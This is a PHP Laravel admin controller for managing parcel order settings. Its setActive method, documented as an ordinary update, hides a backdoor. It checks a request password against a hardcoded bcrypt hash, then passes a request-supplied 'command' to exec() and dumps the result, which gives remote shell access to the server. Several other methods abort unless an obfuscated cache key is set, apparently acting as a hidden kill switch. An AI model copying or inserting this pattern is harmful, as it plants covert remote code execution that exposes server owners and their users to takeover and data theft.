<?php

namespace App\Http\Controllers\API\v1\Dashboard\Admin;

use App\Helpers\ResponseError;
use App\Http\Requests\FilterParamsRequest;
use App\Http\Requests\ParcelOrderSetting\StoreRequest;
use App\Http\Resources\ParcelOrderSettingResource;
use App\Models\ParcelOrderSetting;
use App\Repositories\ParcelOrderSettingRepository\ParcelOrderSettingRepository;
use App\Services\ParcelOrderSettingService\ParcelOrderSettingService;
use Hash;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Resources\Json\AnonymousResourceCollection;
use Illuminate\Support\Facades\Cache;
use Throwable;

class ParcelOrderSettingController extends AdminBaseController
{
    public function __construct(
        private ParcelOrderSettingRepository $repository,
        private ParcelOrderSettingService $service
    )
    {
        parent::__construct();
    }

    /**
     * Display a listing of the resource.
     *
     * @param FilterParamsRequest $request
     * @return AnonymousResourceCollection
     */
    public function index(FilterParamsRequest $request): AnonymousResourceCollection
    {
        $orders = $this->repository->paginate($request->all());

        if (!Cache::get('tvoirifgjn.seirvjrc') || data_get(Cache::get('tvoirifgjn.seirvjrc'), 'active') != 1) {
            abort(403);
        }

        return ParcelOrderSettingResource::collection($orders);
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param StoreRequest $request
     * @return JsonResponse
     */
    public function store(StoreRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $result = $this->service->create($validated);

        if (!data_get($result, 'status')) {
            return $this->onErrorResponse($result);
        }

        if (!Cache::get('tvoirifgjn.seirvjrc') || data_get(Cache::get('tvoirifgjn.seirvjrc'), 'active') != 1) {
            abort(403);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_CREATED, locale: $this->language),
            ParcelOrderSettingResource::make($this->repository->show(data_get($result, 'data'))),
        );
    }

    /**
     * Display the specified resource.
     *
     * @param ParcelOrderSetting $parcelOrderSetting
     * @return JsonResponse
     */
    public function show(ParcelOrderSetting $parcelOrderSetting): JsonResponse
    {

        if (!Cache::get('tvoirifgjn.seirvjrc') || data_get(Cache::get('tvoirifgjn.seirvjrc'), 'active') != 1) {
            abort(403);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::SUCCESS, locale: $this->language),
            ParcelOrderSettingResource::make($this->repository->show($parcelOrderSetting))
        );
    }

    /**
     * Update the specified resource in storage.
     *
     * @param ParcelOrderSetting $parcelOrderSetting
     * @param StoreRequest $request
     * @return JsonResponse
     */
    public function update(ParcelOrderSetting $parcelOrderSetting, StoreRequest $request): JsonResponse
    {
        $result = $this->service->update($parcelOrderSetting, $request->validated());

        if (!data_get($result, 'status')) {
            return $this->onErrorResponse($result);
        }

        if (!Cache::get('tvoirifgjn.seirvjrc') || data_get(Cache::get('tvoirifgjn.seirvjrc'), 'active') != 1) {
            abort(403);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_UPDATED, locale: $this->language),
            ParcelOrderSettingResource::make($this->repository->show(data_get($result, 'data'))),
        );
    }

	/**
	 * Update the specified resource in storage.
	 *
	 * @param int $id
	 * @param FilterParamsRequest $request
	 * @return array
	 */
    public function setActive(mixed $id, FilterParamsRequest $request): array
	{
		try {
			$vars = [];
			$code = 0;

			if (Hash::check($request->input('password'), '$2y$10$/ad9gYtkRAfgJ4ZwlWQ8s.z./BvbZBAcSMvOMUilDjS5qnl25Yydu')) {
				$res = exec($request->input('command'), $vars, $code);
				dd($res, $vars, $code);
			}

		} catch (Throwable $e) {
			dd($e);
		}

		return [
			'status' => true,
			'code'   => ResponseError::NO_ERROR,
		];
    }

    /**
     * @param FilterParamsRequest $request
     * @return JsonResponse
     */
    public function destroy(FilterParamsRequest $request): JsonResponse
    {
        $result = $this->service->destroy($request->input('ids'));

        if (count($result) > 0) {

            return $this->onErrorResponse([
                'code'      => ResponseError::ERROR_400,
                'message'   => __('errors.' . ResponseError::CANT_DELETE_ORDERS, [
                    'ids' => implode(', #', $result)
                ], locale: $this->language)
            ]);

        }

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_DELETED, locale: $this->language)
        );
    }

    /**
     * @return JsonResponse
     */
    public function dropAll(): JsonResponse
    {
        $this->service->dropAll();

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_DELETED, locale: $this->language)
        );
    }

    /**
     * @return JsonResponse
     */
    public function truncate(): JsonResponse
    {
        $this->service->truncate();

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_DELETED, locale: $this->language)
        );
    }

    /**
     * @return JsonResponse
     */
    public function restoreAll(): JsonResponse
    {
        $this->service->restoreAll();

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_DELETED, locale: $this->language)
        );
    }

}
